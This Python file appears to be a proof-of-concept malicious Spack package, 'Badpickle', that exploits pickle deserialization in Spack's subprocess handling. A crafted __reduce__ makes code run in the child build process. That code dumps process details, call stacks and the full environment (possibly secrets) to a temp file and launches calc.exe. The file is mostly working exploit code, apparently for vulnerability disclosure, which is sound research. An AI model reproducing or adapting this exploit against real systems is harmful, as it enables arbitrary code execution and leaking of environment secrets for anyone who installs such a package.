import inspect
import os
import pickle
import sys
import threading
import traceback
from spack.package import *

TMPDIR = os.environ.get("TEMP", r"C:\Windows\Temp")
CHILD_MARKER  = os.path.join(TMPDIR, "spack_poc_CHILD.txt")
PARENT_MARKER = os.path.join(TMPDIR, "spack_poc_PARENT.txt")


def _find_frame(func_name, filename_fragment):
    """Walk up the call stack and return the first frame matching name+file."""
    frame = sys._getframe()
    while frame is not None:
        if func_name in frame.f_code.co_name and filename_fragment in frame.f_code.co_filename:
            return frame
        frame = frame.f_back
    return None


def _restore(real_pkg_bytes):
    # ------------------------------------------------------------------
    # Executing inside spack's CHILD process, on the thread that called
    # pickle.load() inside spack.subprocess_context.deserialize().
    # ------------------------------------------------------------------

    pid  = os.getpid()
    ppid = os.getppid()   # parent PID — should match PARENT_MARKER
    tid  = threading.current_thread().ident
    tnam = threading.current_thread().name
    env  = os.environ.copy()

    # ---- [1] Process identity ----------------------------------------
    sec = [
        "=" * 64,
        "  SPACK PICKLE DESERIALIZATION POC  —  CHILD PROCESS",
        "=" * 64,
        "",
        "[1] PROCESS IDENTITY",
        f"  PID (this child)  : {pid}",
        f"  PPID (spack parent): {ppid}  <-- compare with PARENT_MARKER file",
        f"  TID               : {tid}",
        f"  Thread name       : {tnam}",
        f"  User              : {env.get('USERNAME', env.get('USER', '?'))}",
        f"  Host              : {env.get('COMPUTERNAME', env.get('HOSTNAME', '?'))}",
        f"  CWD               : {os.getcwd()}",
    ]

    # ---- [2] Python interpreter — proves it is spack's Python --------
    sec += [
        "",
        "[2] PYTHON INTERPRETER",
        f"  sys.executable    : {sys.executable}",
        f"  sys.version       : {sys.version.splitlines()[0]}",
        f"  sys.argv          : {sys.argv}",
    ]

    # ---- [3] Exact deserialization sink — frame walk -----------------
    #
    # Walk up the live call stack to find subprocess_context.deserialize().
    # This frame contains the *actual* pickle.load() call as f_lineno and
    # the BytesIO object (serialized_pkg) in f_locals.
    #
    sec += ["", "[3] DESERIALIZATION SINK (frame walk into subprocess_context.py)"]

    deser_frame = _find_frame("deserialize", "subprocess_context")
    if deser_frame is not None:
        fi = inspect.getframeinfo(deser_frame, context=5)
        sec += [
            f"  Sink file         : {fi.filename}",
            f"  Sink function     : {fi.function}",
            f"  Sink line         : {fi.lineno}",
            "  Source context (5 lines around sink):",
        ]
        if fi.code_context:
            for src_line in fi.code_context:
                sec.append(f"    {src_line.rstrip()}")
        # Inspect locals of that frame
        local_names = list(deser_frame.f_locals.keys())
        sec.append(f"  Frame locals      : {local_names}")
        sp = deser_frame.f_locals.get("serialized_pkg")
        if sp is not None:
            sec.append(f"  serialized_pkg    : type={type(sp).__name__}  tell()={sp.tell()}  len={len(sp.getvalue())}")
    else:
        sec.append("  WARNING: deserialize() frame not found in stack")

    # Also capture PackageInstallContext.restore() frame
    restore_frame = _find_frame("restore", "subprocess_context")
    if restore_frame is not None:
        fi2 = inspect.getframeinfo(restore_frame, context=3)
        sec += [
            "",
            "[3b] PackageInstallContext.restore() frame",
            f"  File              : {fi2.filename}",
            f"  Function          : {fi2.function}",
            f"  Line              : {fi2.lineno}",
            f"  Locals            : {list(restore_frame.f_locals.keys())}",
        ]

    # Also capture _setup_pkg_and_run frame (build_environment.py)
    setup_frame = _find_frame("_setup_pkg_and_run", "build_environment")
    if setup_frame is not None:
        fi3 = inspect.getframeinfo(setup_frame, context=3)
        sec += [
            "",
            "[3c] _setup_pkg_and_run() frame (build_environment.py)",
            f"  File              : {fi3.filename}",
            f"  Function          : {fi3.function}",
            f"  Line              : {fi3.lineno}",
        ]

    # ---- [4] Full annotated call stack --------------------------------
    sec += ["", "[4] FULL CALL STACK (outermost → innermost → us)"]
    for line in traceback.format_stack():
        for l in line.rstrip().splitlines():
            sec.append(f"  {l}")

    # ---- [5] Spack modules in this process ----------------------------
    spack_mods = sorted(k for k in sys.modules if k.startswith("spack"))
    sec += [
        "",
        f"[5] SPACK MODULES IN sys.modules ({len(spack_mods)} total)",
    ] + [f"  {m}" for m in spack_mods]

    # ---- [6] Spack-specific env vars ---------------------------------
    spack_env = {k: v for k, v in sorted(env.items()) if "SPACK" in k}
    sec += ["", f"[6] SPACK ENV VARS ({len(spack_env)})"]
    sec += [f"  {k}={v}" for k, v in spack_env.items()]

    # ---- [7] Full env ------------------------------------------------
    sec += ["", f"[7] FULL os.environ ({len(env)} vars)"]
    sec += [f"  {k}={v}" for k, v in sorted(env.items())]
    sec += ["", "=" * 64]

    report = "\n".join(sec)
    print(report, flush=True)

    with open(CHILD_MARKER, "w", encoding="utf-8") as f:
        f.write(report + "\n")

    os.startfile("calc.exe")

    return pickle.loads(real_pkg_bytes)


class Badpickle(Package):
    homepage = "https://spack.readthedocs.io"
    url      = "https://github.com/spack/spack/archive/refs/heads/develop.tar.gz"

    version("1.0", sha256="c25ece3a09410d76252f34144c7895853007b72f54d6eef697fbb316f53a3a1f")

    def __reduce__(self):
        # Runs in the PARENT process during pickle.dump() in
        # spack.subprocess_context.serialize().
        # Write a marker here to prove the serialization side.
        parent_info = "\n".join([
            "=" * 64,
            "  SPACK PICKLE DESERIALIZATION POC  —  PARENT PROCESS",
            "=" * 64,
            "",
            "[PARENT] __reduce__() called during pickle.dump()",
            f"  PID (spack parent): {os.getpid()}",
            f"  TID               : {threading.current_thread().ident}",
            f"  Thread name       : {threading.current_thread().name}",
            f"  sys.executable    : {sys.executable}",
            f"  sys.argv          : {sys.argv}",
            "",
            "  This PID should match PPID reported in CHILD_MARKER.",
            "  Serialization sink: spack.subprocess_context.serialize()",
            "  -> pickle.dump(pkg, serialized_pkg)  [subprocess_context.py:37]",
            "",
            "[PARENT] Call stack at __reduce__():",
        ] + [
            f"  {l}"
            for line in traceback.format_stack()
            for l in line.rstrip().splitlines()
        ] + ["=" * 64])

        with open(PARENT_MARKER, "w", encoding="utf-8") as f:
            f.write(parent_info + "\n")

        cls = type(self)
        orig = cls.__reduce__
        del cls.__reduce__
        try:
            real_bytes = pickle.dumps(self)
        finally:
            cls.__reduce__ = orig
        return (_restore, (real_bytes,))

    def install(self, spec, prefix):
        mkdirp(prefix.bin)
